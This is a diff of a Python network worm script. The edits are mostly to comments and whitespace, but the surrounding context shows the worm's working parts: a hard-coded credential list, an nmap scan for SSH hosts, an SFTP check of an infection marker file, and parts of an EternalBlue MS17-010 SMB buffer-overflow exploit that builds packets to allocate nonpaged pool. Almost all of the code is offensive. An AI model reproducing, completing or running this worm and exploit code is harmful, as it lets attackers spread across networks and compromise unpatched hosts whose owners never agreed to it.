@@ -61,7 +61,7 @@ credList = [
 ]
 
 #########################################################################################################################################
-# The file marking whether the worm should spread
+# The file marking whether the worm has spread
 #########################################################################################################################################
 
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
@@ -102,7 +102,7 @@ def network_values( interface ):
 
 def getLinuxHostsOnTheSameNetwork(ip, broadcast, network, cidr):
 	portScanner = nmap.PortScanner()
-	portScanner.scan( network + "/" + cidr, arguments = '-p 22 --open --exclude ' + ip + ',' + broadcast)	#Ref: https://nmap.org/book/man-target-specification.html
+	portScanner.scan( network + "/" + cidr, arguments = '-p 22 --open --exclude ' + ip + ',' + broadcast)		#Ref: https://nmap.org/book/man-target-specification.html
 	return portScanner.all_hosts()
 
 # Funtion to return Windows hosts running SMB Service (Port 139,445 Open)
@@ -129,7 +129,7 @@ def isInfectedSystem( sftpClient ):
 	# you created when you marked the system
 	# as infected).
 	try:
-		sftpClient.stat( INFECTED_MARKER_FILE )		# Check if remote host is infected
+		sftpClient.stat( INFECTED_MARKER_FILE )									# Check if remote host is infected
 		return True
 	except IOError:
 		return False
@@ -269,7 +269,7 @@ def find_file( file_name ):
 # Windows SMB Buffer Overflow SMB EternalBlue MS17-010 Exploit 
 #####################################################################################################################################################################
 
-##########################################################################################################################
+####################################################################################################################################################################
 '''
 Bug detail:
 - For the buffer overflow bug detail
@@ -280,7 +280,7 @@ Bug detail:
   - Send special session setup command (SMB login command) 
     to allocate big nonpaged pool (use for creating hole)
 '''
-##########################################################################################################################
+#####################################################################################################################################################################
 def getNTStatus(self):
 	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
 setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)
@@ -289,7 +289,8 @@ def sendEcho(conn, tid, data):
 	pkt = smb.NewSMBPacket()
 	pkt['Tid'] = tid
 
-	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
+	##test the transport layer connection with the server
+	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)						
 	transCommand['Parameters'] = smb.SMBEcho_Parameters()
 	transCommand['Data'] = smb.SMBEcho_Data()
 
@@ -335,6 +336,7 @@ def createSessionAllocNonPaged(target, size):
 	conn = smb.SMB(target, target)
 	_, flags2 = conn.get_flags()
 	# FLAGS2_EXTENDED_SECURITY MUST not be set
+	#This indicate that the server sends extended security response
 	flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY
 	# if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
 	if size >= 0xffff:
